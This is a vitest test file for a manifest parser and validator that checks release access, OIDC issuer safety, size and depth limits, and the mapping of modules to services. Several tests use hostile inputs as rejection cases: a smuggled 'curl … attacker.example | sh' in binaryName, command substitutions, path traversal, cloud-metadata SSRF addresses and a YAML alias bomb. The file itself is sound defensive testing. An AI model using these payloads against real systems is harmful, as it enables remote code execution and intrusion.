import { describe, expect, it } from "vitest";
// Used only to measure the quadratic path we deliberately turned OFF, as a control.
import { parse as parseYaml } from "yaml";
import {
  APP_DELIVERABLE_ID,
  ARTIFACT_ROLES,
  compileManualChannelRegex,
  DELIVERABLE_KINDS,
  isArtifactMatch,
  isDeliverableId,
  isIgnoreTag,
  isReservedChannelName,
  matchesArtifactGlob,
  MAX_IGNORE_TAG_LENGTH,
  MAX_DELIVERABLE_ID_LENGTH,
  RELEASE_ARCHES,
  RELEASE_PLATFORMS,
  DEFAULT_STABLE_TAG_PATTERN,
  issuerUrlProblem,
  isSafeIssuerUrl,
  isWebOrigin,
  MAX_WEB_ORIGINS,
  MAX_MANIFEST_BYTES,
  MAX_MANIFEST_DEPTH,
  normalizeAutoIssue,
  parseManifest,
  parseManifestAppDeliverable,
  parseManifestPackDeliverable,
  packVariantKeys,
  validateIngestDocuments,
  validateManifestDocuments,
  webOriginProblem,
  CONTENT_ID_PATTERN,
  MAX_PROVIDES,
  providesListProblem,
} from "./index.js";

const PRODUCT = { slug: "acme", name: "Acme" };

const release = (access?: unknown): Record<string, unknown> => ({
  release: {
    ghOwner: "acme",
    ghRepo: "desktop",
    binaryName: "acme",
    ...(access === undefined ? {} : { access }),
  },
});

function catalogWithSecretDelivery(
  delivery?: unknown,
): Record<string, unknown> {
  return {
    schemaVersion: 1,
    entries: [
      {
        key: "api.token",
        kind: "secret",
        secret: true,
        category: "Secrets",
        label: "API token",
        description: "Token delivered according to the manifest policy.",
        schema: { type: "string", minLength: 1 },
        ...(delivery === undefined ? {} : { delivery }),
      },
    ],
  };
}

describe("manifest contract defaults", () => {
  it("defaults release access to public metadata and public artifacts", () => {
    const res = parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify(release()),
    });

    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.release?.access).toEqual({
      metadata: "public",
      artifacts: "public",
    });
  });

  it("preserves explicit release access values", () => {
    const res = parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify(
        release({ metadata: "authenticated", artifacts: "licensed" }),
      ),
    });

    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.release?.access).toEqual({
      metadata: "authenticated",
      artifacts: "licensed",
    });
  });

  it("rejects unknown release access values", () => {
    const res = parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify(
        release({ metadata: "public", artifacts: "entitled" }),
      ),
    });

    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.join("\n")).toContain(
      "release.access values must be public, authenticated, or licensed.",
    );
  });
});

describe("release candidate filter (stableTagPattern, ignoreTags)", () => {
  const withFields = (fields: Record<string, unknown>) =>
    parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify({
        release: { ...(release().release as object), ...fields },
      }),
    });

  it("normalises undeclared fields to the default filter", () => {
    const res = withFields({});
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.release?.stableTagPattern).toBeNull();
    expect(res.manifest.release?.ignoreTags).toEqual([]);
  });

  it("carries a declared pattern and de-duplicated ignore list", () => {
    const res = withFields({
      stableTagPattern: "^v\\d+\\.\\d+\\.\\d+$",
      ignoreTags: ["channels", "packs", "channels"],
    });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.release?.stableTagPattern).toBe(
      "^v\\d+\\.\\d+\\.\\d+$",
    );
    expect(res.manifest.release?.ignoreTags).toEqual(["channels", "packs"]);
  });

  it("the default pattern fits the declared-pattern cap and matches semver tags only", () => {
    expect(DEFAULT_STABLE_TAG_PATTERN.length).toBeLessThanOrEqual(80);
    const re = compileManualChannelRegex(DEFAULT_STABLE_TAG_PATTERN)!;
    for (const tag of ["v1.2.3", "1.2.3", "v2.0.0-rc.1", "v1.0.0+build.5"])
      expect(re.test(tag), tag).toBe(true);
    for (const tag of ["channels", "packs", "v1.2", "v01.2.3", "release-1.2.3"])
      expect(re.test(tag), tag).toBe(false);
  });

  it("counts an ignore tag's length in code points, as the schema's maxLength does", () => {
    // 255 astral characters are 510 UTF-16 units: the schema accepts them, so must the validator.
    expect(isIgnoreTag("\u{1F680}".repeat(MAX_IGNORE_TAG_LENGTH))).toBe(true);
    expect(isIgnoreTag("\u{1F680}".repeat(MAX_IGNORE_TAG_LENGTH + 1))).toBe(
      false,
    );
    expect(isIgnoreTag("a".repeat(MAX_IGNORE_TAG_LENGTH + 1))).toBe(false);
  });

  it("rejects an unsafe pattern and malformed ignore entries", () => {
    const res = withFields({ stableTagPattern: "(", ignoreTags: ["", "a b"] });
    expect(res.ok).toBe(false);
  });
});

describe("release string character classes (R6-01, R6-07)", () => {
  const parse = (releaseOver: Record<string, unknown>) =>
    parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify({
        release: {
          ghOwner: "acme",
          ghRepo: "desktop",
          binaryName: "acme",
          ...releaseOver,
        },
      }),
    });

  it("rejects a binaryName carrying shell metacharacters", () => {
    for (const binaryName of [
      "acme\ncurl -fsSL https://attacker.example/x | sh\n#",
      'acme"; id > /tmp/pwned; :"',
      "acme`id`",
      "acme$(id)",
      "acme'; id; '",
      "-acme",
      "a".repeat(65),
    ]) {
      const res = parse({ binaryName });
      expect(res.ok).toBe(false);
      if (res.ok) return;
      expect(res.errors.join("\n")).toContain("release.binaryName must match");
    }
  });

  it("accepts a conventional binaryName", () => {
    for (const binaryName of ["acme", "acme-cli", "acme_cli", "Acme.2"]) {
      expect(parse({ binaryName }).ok).toBe(true);
    }
  });

  it("rejects dot-segment / query smuggling in channelWorkflow", () => {
    for (const channelWorkflow of [
      "../../../../../orgs/attacker-org/repos#",
      "wf.yml/runs?actor=evil&",
      "channel.txt",
    ]) {
      const res = parse({ channelWorkflow });
      expect(res.ok).toBe(false);
      if (res.ok) return;
      expect(res.errors.join("\n")).toContain("release.channelWorkflow");
    }
    expect(parse({ channelWorkflow: "channel.yml" }).ok).toBe(true);
    expect(parse({ channelWorkflow: "channel.yaml" }).ok).toBe(true);
    expect(parse({ channelWorkflow: "12345678" }).ok).toBe(true);
  });

  it("bounds ghOwner / ghRepo / betaBranch / summaryMarker / sparkleEd25519Pub", () => {
    expect(parse({ ghOwner: "acme/../victim" }).ok).toBe(false);
    expect(parse({ ghRepo: "desktop?x=1" }).ok).toBe(false);
    expect(parse({ betaBranch: "main&injected=1" }).ok).toBe(false);
    expect(parse({ summaryMarker: "a".repeat(200) }).ok).toBe(false);
    expect(parse({ sparkleEd25519Pub: "not a key!" }).ok).toBe(false);
    expect(parse({ sparkleEd25519Pub: "PUBKEY==" }).ok).toBe(true);
  });

  it("parses releaseKeys into { kid, publicKey } and defaults to []", () => {
    const key = "11qYAYKxCrfVS_7TyWQHOg7hcvPapiMlrwIaaPcHURo";
    const res = parse({ releaseKeys: [{ kid: "ci-2026", publicKey: key }] });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.release?.releaseKeys).toEqual([
      { kid: "ci-2026", publicKey: key },
    ]);
    const none = parse({});
    expect(none.ok && none.manifest.release?.releaseKeys).toEqual([]);
  });

  it("refuses a release key that is the Sparkle key, whatever the base64 spelling", () => {
    const res = parse({
      sparkleEd25519Pub: "11qYAYKxCrfVS/7TyWQHOg7hcvPapiMlrwIaaPcHURo=",
      releaseKeys: [
        {
          kid: "ci",
          publicKey: "11qYAYKxCrfVS_7TyWQHOg7hcvPapiMlrwIaaPcHURo",
        },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.join("\n")).toContain("sparkleEd25519Pub");
  });

  it("drops requireSparkleSignature: a repo cannot disable the platform's own control", () => {
    const res = parse({
      artifactPolicy: { requireSparkleSignature: false, requireDmg: true },
    });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(JSON.stringify(res.manifest.release?.artifactPolicy)).not.toContain(
      "requireSparkleSignature",
    );
    expect(res.manifest.release?.artifactPolicy?.requireDmg).toBe(true);
  });
});

describe("OIDC provider validation", () => {
  it("defaults missing oidc.provider to platform", () => {
    const res = parseManifest({
      product: JSON.stringify({
        ...PRODUCT,
        oidc: { groupRoleMap: {} },
      }),
      schema: JSON.stringify(catalogWithSecretDelivery()),
    });

    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.oidc?.provider).toBe("platform");
    expect(res.manifest.oidc?.issuer).toBe("");
    expect(res.manifest.oidc?.clientId).toBe("");
  });

  it("accepts platform OIDC without product issuer/client credentials", () => {
    const res = validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: { provider: "platform", groupRoleMap: {} },
      },
      schema: catalogWithSecretDelivery(),
    });

    expect(res.ok).toBe(true);
  });

  it("does not require a product client secret for platform OIDC", () => {
    const res = validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: {
          provider: "platform",
          clientSecretSecret: "OIDC_CLIENT_SECRET",
        },
      },
      schema: catalogWithSecretDelivery(),
    });

    expect(res.ok).toBe(true);
    expect(res.requiredSecrets).not.toContain("OIDC_CLIENT_SECRET");
  });

  it("requires custom OIDC issuer and clientId", () => {
    const res = validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: { provider: "custom" },
      },
      schema: catalogWithSecretDelivery(),
    });

    expect(res.ok).toBe(false);
    expect(res.errors).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ code: "invalid_oidc_issuer" }),
        expect.objectContaining({ code: "missing_oidc_client_id" }),
      ]),
    );
  });

  it("accepts a complete custom OIDC provider", () => {
    const res = parseManifest({
      product: JSON.stringify({
        ...PRODUCT,
        oidc: {
          provider: "custom",
          issuer: "https://id.example.test",
          clientId: "acme",
          clientSecretRef: "OIDC_CLIENT_SECRET",
          redirectUris: ["https://key.example.test/acme/auth/callback"],
          groupRoleMap: { users: { tier: "standard" } },
        },
      }),
      schema: JSON.stringify(catalogWithSecretDelivery()),
    });

    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.oidc?.provider).toBe("custom");
    expect(res.manifest.oidc?.issuer).toBe("https://id.example.test");
  });

  it("rejects unknown oidc.provider values", () => {
    const res = validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: { provider: "legacy" },
      },
      schema: catalogWithSecretDelivery(),
    });

    expect(res.ok).toBe(false);
    expect(res.errors).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ code: "invalid_oidc_provider" }),
      ]),
    );
  });
});

describe("secret delivery validation", () => {
  it.each(["serverOnly", "clientScoped", "edgeMint"] as const)(
    "accepts %s delivery for secret entries",
    (delivery) => {
      const result = validateManifestDocuments({
        product: PRODUCT,
        schema: catalogWithSecretDelivery(delivery),
      });

      expect(result.ok).toBe(true);
    },
  );

  it("rejects unknown secret delivery values", () => {
    const result = validateManifestDocuments({
      product: PRODUCT,
      schema: catalogWithSecretDelivery("browserGlobal"),
    });

    expect(result.ok).toBe(false);
    expect(result.errors).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          file: "schema",
          code: "invalid_catalog_shape",
          message: expect.stringContaining("delivery must be serverOnly"),
        }),
      ]),
    );
  });
});

describe("OIDC issuer safety (R9-01)", () => {
  const withIssuer = (issuer: unknown) =>
    validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: { provider: "custom", issuer, clientId: "acme" },
      },
      schema: catalogWithSecretDelivery(),
    });

  it("rejects plain http, non-http schemes, credentials, and a query/fragment", () => {
    for (const issuer of [
      "http://id.example",
      "ftp://id.example",
      "javascript:alert(1)",
      "not a url",
      "",
      "https://user:pw@id.example",
      "https://id.example/?next=https://evil.example",
      "https://id.example/#x",
      `https://id.example/${"a".repeat(4000)}`,
    ]) {
      expect(withIssuer(issuer).ok, String(issuer)).toBe(false);
      expect(isSafeIssuerUrl(issuer), String(issuer)).toBe(false);
    }
  });

  it("rejects every private / loopback / link-local / reserved address literal notation", () => {
    for (const issuer of [
      "https://169.254.169.254/", // cloud metadata
      "http://169.254.169.254/latest/meta-data",
      "https://10.1.2.3/",
      "https://172.16.0.1/",
      "https://172.31.255.254/",
      "https://192.168.0.1/",
      "https://192.0.0.1/",
      "https://198.18.0.1/",
      "https://100.64.0.1/",
      "https://127.0.0.2/",
      "https://0.0.0.0/",
      "https://224.0.0.1/",
      "https://255.255.255.255/",
      "https://[fd00::1]/",
      "https://[fc00::1]/",
      "https://[fe80::1]/",
      "https://[ff02::1]/",
      "https://[::]/",
      "https://[::ffff:169.254.169.254]/", // IPv4-mapped
      "https://[::ffff:a9fe:a9fe]/", // the same address, hex hextets
      "https://[0:0:0:0:0:0:a9fe:a9fe]/", // IPv4-compatible (deprecated)
      "https://[::ffff:10.0.0.1]/",
    ]) {
      expect(isSafeIssuerUrl(issuer), issuer).toBe(false);
      expect(issuerUrlProblem(issuer), issuer).toMatch(
        /private, loopback, link-local|https/,
      );
    }
  });

  it("accepts a real IdP and the loopback dev carve-out", () => {
    for (const issuer of [
      "https://id.example.test",
      "https://id.example.test/oidc/v1",
      "https://8.8.8.8/", // a public address literal is not reserved
      "https://[2606:4700::1]/",
      "http://localhost:8788",
      "http://127.0.0.1:8788",
      "http://[::1]:8788",
      "https://localhost:8443",
      "https://2130706433/", // 127.0.0.1 written as a decimal integer
    ]) {
      expect(issuerUrlProblem(issuer), issuer).toBeNull();
      expect(withIssuer(issuer).ok, issuer).toBe(true);
    }
  });

  it("bounds redirect URIs (count, length, credentials)", () => {
    const oidc = (redirectUris: unknown) =>
      validateManifestDocuments({
        product: {
          ...PRODUCT,
          oidc: {
            provider: "custom",
            issuer: "https://id.example.test",
            clientId: "acme",
            redirectUris,
          },
        },
        schema: catalogWithSecretDelivery(),
      });
    expect(oidc(["https://user:pw@key.example/cb"]).ok).toBe(false);
    expect(oidc([`https://key.example/${"a".repeat(4000)}`]).ok).toBe(false);
    expect(
      oidc(Array.from({ length: 21 }, (_, i) => `https://key.example/${i}`)).ok,
    ).toBe(false);
    // Loopback redirect URIs stay legal: native/desktop apps genuinely use them.
    expect(oidc(["http://127.0.0.1:53123/callback"]).ok).toBe(true);
  });
});

describe("manifest document limits (R7-02)", () => {
  const validProduct = JSON.stringify(PRODUCT);
  const validSchema = JSON.stringify(catalogWithSecretDelivery());

  it("refuses a document over the byte cap before parsing it", () => {
    // The R7-02 PoC shape: a flat YAML map whose key count drives a quadratic parse.
    let yaml = "slug: acme\nname: Acme\n";
    for (let i = 0; yaml.length < MAX_MANIFEST_BYTES * 2; i++) {
      yaml += `k${i}: ${"v".repeat(10)}\n`;
    }
    const res = parseManifest({ schema: validSchema, product: yaml });

    expect(res.ok).toBe(false);
    if (res.ok) return;
    // This error can ONLY be produced by the pre-parse byte check — the parser never runs,
    // and a parsed-then-rejected document fails with a different message. The error text is
    // therefore the proof that rejection was O(1); a wall-clock assertion added nothing on
    // top of it and made the test fail on slow CI runners for reasons unrelated to R7-02.
    expect(res.errors.join("\n")).toContain(
      `${MAX_MANIFEST_BYTES}-byte .pkey/ document limit`,
    );
  });

  it("counts UTF-8 bytes, not UTF-16 code units", () => {
    // Just under the cap in code units, well over it in bytes.
    const wide = `name: "${"一".repeat(MAX_MANIFEST_BYTES - 100)}"\nslug: acme\n`;
    expect(wide.length).toBeLessThan(MAX_MANIFEST_BYTES);
    const res = parseManifest({ schema: validSchema, product: wide });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.join("\n")).toContain("document limit");
  });

  it("parses a large-but-legal YAML manifest without the quadratic uniqueKeys scan", () => {
    let yaml = "slug: acme\nname: Acme\n";
    for (let i = 0; yaml.length < MAX_MANIFEST_BYTES - 4096; i++) {
      yaml += `k${i}: ${"v".repeat(10)}\n`;
    }

    // A large-but-legal document must still parse.
    expect(parseManifest({ schema: validSchema, product: yaml }).ok).toBe(true);
  });

  it("parses with uniqueKeys disabled — the quadratic scan is off", () => {
    // Asserted by BEHAVIOUR, not by a clock. Two earlier attempts here were both wrong:
    // an absolute `toBeLessThan(1000)` failed CI at 1098ms, and a relative
    // production-vs-quadratic ratio only reached ~1.8x because the 34x gap was measured at
    // 1.67 MB — a size the byte cap now makes unreachable. Any timing test of this property
    // is therefore either flaky or, at permitted sizes, measuring nothing.
    //
    // `yaml` THROWS on a duplicate key when `uniqueKeys` is true and accepts it (last wins)
    // when false, so a duplicate-key document parsing successfully is a deterministic proof
    // that the option is off — which is the actual R7-02 mitigation.
    const dupes = "slug: acme\nname: Acme\nname: Acme Two\n";
    expect(() => parseYaml(dupes, { uniqueKeys: true })).toThrow();
    expect(parseYaml(dupes, { uniqueKeys: false })).toMatchObject({
      slug: "acme",
    });

    // And the production path agrees: it accepts the document rather than erroring on it.
    const res = parseManifest({ schema: validSchema, product: dupes });
    expect(res.ok ? "" : res.errors.join("\n")).not.toContain("duplicate");
  });

  it("refuses a document nested past the depth cap, in JSON and in YAML", () => {
    const deep = (n: number): string => "[".repeat(n) + "]".repeat(n);
    const json = `{"slug":"acme","name":"Acme","x":${deep(MAX_MANIFEST_DEPTH + 5)}}`;
    const jsonRes = parseManifest({ schema: validSchema, product: json });
    expect(jsonRes.ok).toBe(false);
    if (!jsonRes.ok) {
      expect(jsonRes.errors.join("\n")).toContain("nested deeper than");
    }

    const yaml = `slug: acme\nname: Acme\nx: ${deep(MAX_MANIFEST_DEPTH + 5)}\n`;
    const yamlRes = parseManifest({ schema: validSchema, product: yaml });
    expect(yamlRes.ok).toBe(false);
    if (!yamlRes.ok) {
      expect(yamlRes.errors.join("\n")).toContain("nested deeper than");
    }

    // A profile payload nested within the cap is still fine.
    expect(
      parseManifest({
        schema: validSchema,
        product: `{"slug":"acme","name":"Acme","x":${deep(8)}}`,
      }).ok,
    ).toBe(true);
  });

  it("bounds YAML alias expansion (billion laughs)", () => {
    const bomb = [
      "slug: acme",
      "name: Acme",
      "a: &a [x, x, x, x, x, x, x, x, x]",
      "b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]",
      "c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]",
      "d: [*c, *c, *c, *c, *c, *c, *c, *c, *c]",
      "",
    ].join("\n");
    const res = parseManifest({ schema: validSchema, product: bomb });
    expect(res.ok).toBe(false);
  });

  it("still parses the ordinary JSON and YAML manifests it always did", () => {
    expect(
      parseManifest({ schema: validSchema, product: validProduct }).ok,
    ).toBe(true);
    expect(
      parseManifest({
        schema: validSchema,
        product: "slug: acme\nname: Acme\n",
      }).ok,
    ).toBe(true);
  });
});

describe("manifest identifier character classes (R9-01 audit)", () => {
  const product = (over: Record<string, unknown>) =>
    validateManifestDocuments({
      product: { ...PRODUCT, ...over },
      schema: catalogWithSecretDelivery(),
    });

  it("bounds slug, name, and adminGroup", () => {
    expect(product({ slug: "a".repeat(65) }).ok).toBe(false);
    expect(product({ name: "a".repeat(201) }).ok).toBe(false);
    expect(product({ name: "Acme\nX-Injected: 1" }).ok).toBe(false);
    expect(product({ adminGroup: "admins; drop" }).ok).toBe(false);
    expect(product({ adminGroup: "corp/admins" }).ok).toBe(true);
  });

  it("constrains provisioning claim / entitlementKey / secretUrlTemplate / allowedHosts", () => {
    const hook = (over: Record<string, unknown>) =>
      product({
        provisioning: [{ claim: "vpnAccess", ...over }],
      });
    // A claim name is a property lookup on the decoded ID token.
    expect(product({ provisioning: [{ claim: "__proto__" }] }).ok).toBe(false);
    expect(product({ provisioning: [{ claim: "constructor" }] }).ok).toBe(
      false,
    );
    expect(hook({ entitlementKey: "a b" }).ok).toBe(false);
    // The template is handed to the client as a secret; the host must be fixed at ingest, and
    // `allowedHosts: [""]` must not be able to wave through a non-http scheme.
    expect(
      hook({ secretKey: "vpn.url", secretUrlTemplate: "javascript:alert(1)" })
        .ok,
    ).toBe(false);
    expect(
      hook({
        secretKey: "vpn.url",
        secretUrlTemplate: "http://vpn.example/{claim}",
      }).ok,
    ).toBe(false);
    expect(
      hook({
        secretKey: "vpn.url",
        secretUrlTemplate: "https://{claim}.evil.example/",
      }).ok,
    ).toBe(false);
    expect(hook({ allowedHosts: [""] }).ok).toBe(false);
    expect(
      hook({
        secretKey: "vpn.url",
        secretUrlTemplate: "https://vpn.example/{claim}",
        allowedHosts: ["vpn.example"],
      }).ok,
    ).toBe(true);
  });

  it("constrains edgeMint id / kid, tier channels and version bounds, and probe declarations", () => {
    const withRelease = (edgeMint: unknown) =>
      validateManifestDocuments({
        product: PRODUCT,
        schema: catalogWithSecretDelivery(),
        release: { ghOwner: "acme", ghRepo: "desktop", edgeMint },
      });
    const recipe = (over: Record<string, unknown>) => ({
      id: "musickit",
      alg: "ES256",
      signingKeySecret: "MINT_KEY",
      ...over,
    });
    // The id is a URL path segment on /<product>/mint/<id>/auth.
    expect(withRelease([recipe({ id: "../../admin" })]).ok).toBe(false);
    expect(withRelease([recipe({ kid: 'x"' })]).ok).toBe(false);
    expect(withRelease([recipe({ audience: "a".repeat(201) })]).ok).toBe(false);
    expect(withRelease([recipe({})]).ok).toBe(true);

    expect(product({ tiers: [{ id: "t", channels: ["../beta"] }] }).ok).toBe(
      false,
    );
    expect(product({ tiers: [{ id: "t", minVersion: "latest" }] }).ok).toBe(
      false,
    );
    expect(
      product({ tiers: [{ id: "t", channels: ["beta"], minVersion: "1.2.3" }] })
        .ok,
    ).toBe(true);

    expect(
      product({ fingerprint: { probes: [{ id: "has app", macos: "/A.app" }] } })
        .ok,
    ).toBe(false);
    expect(
      product({
        fingerprint: {
          probes: [{ id: "hasApp", macos: "/Applications/A.app" }],
        },
      }).ok,
    ).toBe(true);
    expect(product({ autoIssue: { enabled: true, tierId: "a b" } }).ok).toBe(
      false,
    );
  });
});

// ── Polaris Key service enablement (design spec §2.2 / §2.3) ─────────────────────
//
// The `modules:` block used to be validated and then thrown away. It is now the source of a
// product's `services_json` — the single authority for which routes exist, which discovery
// fragments are emitted, and which console sections appear — so what it maps to is a wire
// contract, not a hint.
//
// Two vocabularies are accepted on the way in (the original module names and the service
// slugs they became); exactly one comes out.

describe("module vocabulary → service slugs", () => {
  const validate = (over: Record<string, unknown>) =>
    validateManifestDocuments({
      product: { ...PRODUCT, ...over },
      schema: catalogWithSecretDelivery(),
      release: release().release,
    });

  const parse = (over: Record<string, unknown>) =>
    parseManifest({
      product: JSON.stringify({ ...PRODUCT, ...over }),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify(release()),
    });

  const enabledOf = (over: Record<string, unknown>): string[] => {
    const res = parse(over);
    if (!res.ok) throw new Error(res.errors.join("; "));
    return Object.entries(res.manifest.services)
      .filter(([, v]) => v.enabled)
      .map(([k]) => k);
  };

  it("defaults an undeclared modules block to license + config", () => {
    expect(validate({}).enabledModules).toEqual(["license", "config"]);
    expect(enabledOf({})).toEqual(["license", "config"]);
  });

  it("defaults a modules block that enables nothing", () => {
    expect(
      validate({ modules: { licensing: { enabled: false } } }).enabledModules,
    ).toEqual(["license", "config"]);
  });

  it("maps licensing → license", () => {
    expect(
      validate({ modules: { licensing: { enabled: true } } }).enabledModules,
    ).toEqual(["license"]);
  });

  it("maps releases → release, distribution AND update", () => {
    // The old module meant "this product distributes software", which the suite splits into
    // the truth store, delivery and the feed (D-05, README §3.2). Mapping it to release alone
    // would silently take the appcast and /version away from every product already serving them.
    expect(
      validate({ modules: { releases: { enabled: true } } }).enabledModules,
    ).toEqual(["release", "distribution", "update"]);
  });

  it("maps oidc → identity", () => {
    expect(
      validate({
        modules: { oidc: { enabled: true } },
        oidc: { provider: "platform" },
      }).enabledModules,
    ).toEqual(["identity"]);
  });

  it("folds edgeMint into config (D-19: a secret-delivery capability, not a service)", () => {
    expect(
      validate({ modules: { edgeMint: { enabled: true } } }).enabledModules,
    ).toEqual(["config"]);
  });

  it("accepts the new slugs directly", () => {
    expect(
      validate({
        modules: {
          license: { enabled: true },
          config: { enabled: true },
          release: { enabled: true },
          distribution: { enabled: true },
          update: { enabled: true },
          identity: { enabled: true },
        },
        oidc: { provider: "platform" },
      }).enabledModules,
    ).toEqual([
      "license",
      "config",
      "release",
      "distribution",
      "update",
      "identity",
    ]);
  });

  it("collapses a mixed-vocabulary block instead of double-counting", () => {
    expect(
      validate({
        modules: {
          licensing: { enabled: true },
          license: { enabled: true },
          releases: { enabled: true },
          release: { enabled: true },
        },
      }).enabledModules,
    ).toEqual(["license", "release", "distribution", "update"]);
  });

  it("reports in canonical order whatever order the manifest used", () => {
    expect(
      validate({
        modules: {
          update: { enabled: true },
          release: { enabled: true },
          config: { enabled: true },
        },
      }).enabledModules,
    ).toEqual(["config", "release", "update"]);
  });

  it("ignores an unknown module name rather than refusing the product", () => {
    const res = validate({
      modules: { license: { enabled: true }, telemetry: { enabled: true } },
    });
    expect(res.ok).toBe(true);
    expect(res.enabledModules).toEqual(["license"]);
  });

  it("only counts modules explicitly enabled", () => {
    expect(
      validate({
        modules: { license: { enabled: true }, release: { enabled: "yes" } },
      }).enabledModules,
    ).toEqual(["license"]);
  });
});

describe("parseManifest carries the enablement set", () => {
  const parse = (over: Record<string, unknown>, withRelease = true) =>
    parseManifest({
      product: JSON.stringify({ ...PRODUCT, ...over }),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      ...(withRelease ? { release: JSON.stringify(release()) } : {}),
    });

  it("emits a COMPLETE map — every slug present with an explicit boolean", () => {
    // The persist site does `JSON.stringify(manifest.services)` straight into
    // `products.services_json`; it must not have to decide anything of its own.
    const res = parse({ modules: { licensing: { enabled: true } } });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.services).toEqual({
      license: { enabled: true },
      config: { enabled: false },
      release: { enabled: false },
      distribution: { enabled: false },
      update: { enabled: false },
      identity: { enabled: false },
    });
  });

  it("defaults to license + config when the manifest declares nothing", () => {
    const res = parse({});
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.services).toEqual({
      license: { enabled: true },
      config: { enabled: true },
      release: { enabled: false },
      distribution: { enabled: false },
      update: { enabled: false },
      identity: { enabled: false },
    });
  });

  it("turns a legacy releases manifest into release + distribution + update", () => {
    const res = parse({ modules: { releases: { enabled: true } } });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.services.release.enabled).toBe(true);
    expect(res.manifest.services.distribution.enabled).toBe(true);
    expect(res.manifest.services.update.enabled).toBe(true);
  });
});

describe("the release ← distribution ← update chain", () => {
  const validate = (modules: Record<string, unknown>) =>
    validateManifestDocuments({
      product: { ...PRODUCT, modules },
      schema: catalogWithSecretDelivery(),
      release: release().release,
    });
  const codes = (modules: Record<string, unknown>) =>
    validate(modules).errors.map((e) => e.code);

  it("refuses distribution declared without release", () => {
    // Distribution delivers what Release says exists; alone it has nothing to deliver.
    expect(codes({ distribution: { enabled: true } })).toContain(
      "distribution_requires_release",
    );
  });

  it("refuses update declared without distribution", () => {
    // Update serves a feed over what Distribution delivered. Release alone is not enough.
    const res = validate({
      release: { enabled: true },
      update: { enabled: true },
    });
    expect(res.ok).toBe(false);
    expect(res.errors.map((e) => e.code)).toEqual([
      "update_requires_distribution",
    ]);
  });

  it("refuses update alone with update_requires_distribution, never update_requires_release", () => {
    // The retired code is subsumed (README §3.2): it must never be emitted again.
    const got = codes({ config: { enabled: true }, update: { enabled: true } });
    expect(got).toContain("update_requires_distribution");
    expect(got).not.toContain("update_requires_release");
  });

  it("accepts the whole chain", () => {
    const res = validate({
      release: { enabled: true },
      distribution: { enabled: true },
      update: { enabled: true },
    });
    expect(res.errors).toEqual([]);
  });

  it("accepts release alone, and release + distribution", () => {
    expect(validate({ release: { enabled: true } }).ok).toBe(true);
    expect(
      validate({
        release: { enabled: true },
        distribution: { enabled: true },
      }).ok,
    ).toBe(true);
  });

  it("cannot be tripped by the legacy releases module", () => {
    // `releases` maps to all three, so the mapping can never produce its own violation.
    const res = validate({ releases: { enabled: true } });
    expect(res.ok).toBe(true);
    expect(res.enabledModules).toEqual(["release", "distribution", "update"]);
  });

  it("surfaces through parseManifest as a hard failure", () => {
    const res = parseManifest({
      product: JSON.stringify({
        ...PRODUCT,
        modules: { release: { enabled: true }, update: { enabled: true } },
      }),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify(release()),
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.join("\n")).toContain("distribution must be enabled too");
  });
});

describe("config_without_activation stays a warning", () => {
  const validate = (
    modules: Record<string, unknown>,
    over: Record<string, unknown> = {},
  ) =>
    validateManifestDocuments({
      product: { ...PRODUCT, modules, ...over },
      schema: catalogWithSecretDelivery(),
    });

  it("warns — but does not refuse — a config-only product", () => {
    // D-08 / wire v3 §2.2: a config-only product issuing config documents to registered
    // devices is the wire-level PROOF of service independence, so this cannot be an error.
    // The registration-policy-dependent upgrade to an error lands with device registration.
    const res = validate({ config: { enabled: true } });
    expect(res.ok).toBe(true);
    expect(res.warnings.map((w) => w.code)).toContain(
      "config_without_activation",
    );
    expect(res.errors.map((e) => e.code)).not.toContain(
      "config_without_activation",
    );
  });

  it("is silent when license provides activation", () => {
    expect(
      validate({
        config: { enabled: true },
        license: { enabled: true },
      }).warnings.map((w) => w.code),
    ).not.toContain("config_without_activation");
  });

  it("is silent when identity provides activation", () => {
    expect(
      validate(
        { config: { enabled: true }, identity: { enabled: true } },
        { oidc: { provider: "platform" } },
      ).warnings.map((w) => w.code),
    ).not.toContain("config_without_activation");
  });

  it("recognises the legacy vocabulary as activation too", () => {
    expect(
      validate({
        config: { enabled: true },
        licensing: { enabled: true },
      }).warnings.map((w) => w.code),
    ).not.toContain("config_without_activation");
  });
});
